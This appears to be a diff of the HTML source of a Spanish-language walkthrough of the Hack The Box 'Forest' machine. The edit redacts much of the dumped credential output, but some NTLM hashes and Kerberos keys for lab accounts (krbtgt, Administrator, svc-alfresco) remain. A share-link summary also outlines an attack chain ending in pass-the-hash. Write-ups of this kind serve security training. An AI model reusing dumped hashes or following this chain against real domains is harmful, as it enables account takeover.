-htb.local<span class="se">\S</span>M_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local<span class="se">\S</span>M_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local<span class="se">\S</span>M_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local<span class="se">\S</span>M_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-htb.local<span class="se">\H</span>ealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
-htb.local<span class="se">\H</span>ealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
-htb.local<span class="se">\H</span>ealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
-htb.local<span class="se">\H</span>ealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
-htb.local<span class="se">\H</span>ealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
-htb.local<span class="se">\H</span>ealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
-htb.local<span class="se">\H</span>ealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
-htb.local<span class="se">\H</span>ealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
-htb.local<span class="se">\H</span>ealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
-htb.local<span class="se">\H</span>ealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
-htb.local<span class="se">\H</span>ealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
+<span class="o">[</span>... REDACTED ...<span class="o">]</span>
 htb.local<span class="se">\s</span>ebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
 htb.local<span class="se">\l</span>ucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
 htb.local<span class="se">\s</span>vc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
@@ -2700,39 +2528,7 @@ EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1::
 krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
 krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
 krbtgt:des-cbc-md5:9dd5647a31518ca8
-htb.local<span class="se">\H</span>ealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
-htb.local<span class="se">\H</span>ealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
-htb.local<span class="se">\H</span>ealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
-htb.local<span class="se">\H</span>ealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
-htb.local<span class="se">\H</span>ealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
-htb.local<span class="se">\H</span>ealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
-htb.local<span class="se">\H</span>ealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
-htb.local<span class="se">\H</span>ealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
-htb.local<span class="se">\H</span>ealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
-htb.local<span class="se">\H</span>ealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
-htb.local<span class="se">\H</span>ealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
-htb.local<span class="se">\H</span>ealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
-htb.local<span class="se">\H</span>ealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
-htb.local<span class="se">\H</span>ealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
-htb.local<span class="se">\H</span>ealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
-htb.local<span class="se">\H</span>ealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
-htb.local<span class="se">\H</span>ealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
-htb.local<span class="se">\H</span>ealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
-htb.local<span class="se">\H</span>ealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
-htb.local<span class="se">\H</span>ealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
-htb.local<span class="se">\H</span>ealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
-htb.local<span class="se">\H</span>ealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
-htb.local<span class="se">\H</span>ealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
-htb.local<span class="se">\H</span>ealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
-htb.local<span class="se">\H</span>ealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
-htb.local<span class="se">\H</span>ealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
-htb.local<span class="se">\H</span>ealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
-htb.local<span class="se">\H</span>ealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
-htb.local<span class="se">\H</span>ealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
-htb.local<span class="se">\H</span>ealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
-htb.local<span class="se">\H</span>ealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
-htb.local<span class="se">\H</span>ealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
-htb.local<span class="se">\H</span>ealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
+<span class="o">[</span>... REDACTED ...<span class="o">]</span>
 htb.local<span class="se">\s</span>ebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
 htb.local<span class="se">\s</span>ebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
 htb.local<span class="se">\s</span>ebastien:des-cbc-md5:702a3445e0d65b58
@@ -2853,7 +2649,7 @@ htb.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b514
       
     
       
-        <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fsckull.github.io%2fposts%2fforest%2f&title=Hack%20The%20Box%20-%20Forest &summary=&source=Walkthrough%20%3a%3a%20Writeups%20de%20rooms%20y%20maquinas%20de%20TryHackMe%2c%20HackTheBox%20y%20CTFs%2c%20en%20espa%c3%b1ol" target="_blank" rel="noreferer" title="LinkedIn" aria-label="LinkedIn Share Button" class="donation__item" data-type="share">
+        <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fsckull.github.io%2fposts%2fforest%2f&title=Hack%20The%20Box%20-%20Forest &summary=Forest%20de%20HackThebox.%20Encontramos%20una%20lista%20de%20usuarios%20con%20enum4linux%20los%20cuales%20utilizamos%20con%20Impacket%20para%20realizar%20AS-REP%20Roasting%20attack%20con%20lo%20cual%20obtuvimos%20credenciales%20y%20acceso%20por%20WinRM.%20Con%20BloodHound%20enumeramos%20y%20con%20Aclpwn%20obtuvimos%20privilegios%20administrativos%20para%20luego%20dumpear%20los%20hashes%20y%20finalmente%20realizar%20Pass-the-Hash%20para%20obtener%20una%20shell%20como%20administrador.&source=Walkthrough%20-%20Writeups%20%3a%3a%20TryHackMe%2c%20HackTheBox%2c%20CTFs%2c%20espa%c3%b1ol" target="_blank" rel="noreferer" title="LinkedIn" aria-label="LinkedIn Share Button" class="donation__item" data-type="share">
           <svg data-name="linkedin" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m23.994 24v-.001h.006v-8.802c0-4.306-.927-7.623-5.961-7.623-2.42 0-4.044 1.328-4.707 2.587h-.07v-2.185h-4.773v16.023h4.97v-7.934c0-2.089.396-4.109 2.983-4.109 2.549 0 2.587 2.384 2.587 4.243v7.801z"/><path d="m.396 7.977h4.976v16.023h-4.976z"/><path d="m2.882 0c-1.591 0-2.882 1.291-2.882 2.882s1.291 2.909 2.882 2.909 2.882-1.318 2.882-2.909c-.001-1.591-1.292-2.882-2.882-2.882z"/></svg>
         </a>
       
@@ -4189,7 +3985,7 @@ var a = document.getElementsByClassName('navbar__menu-item')
         <li><a href="#smbmap">SMBMAP</a></li>
       </ul>
     </li>
-    <li><a href="#user-svc-alfresco">User svc-alfresco</a></li>
+    <li><a href="#user---svc-alfresco">User - SVC-ALFRESCO</a></li>
     <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a>
       <ul>
         <li><a href="#booldhoundpy">Booldhound.py</a></li>
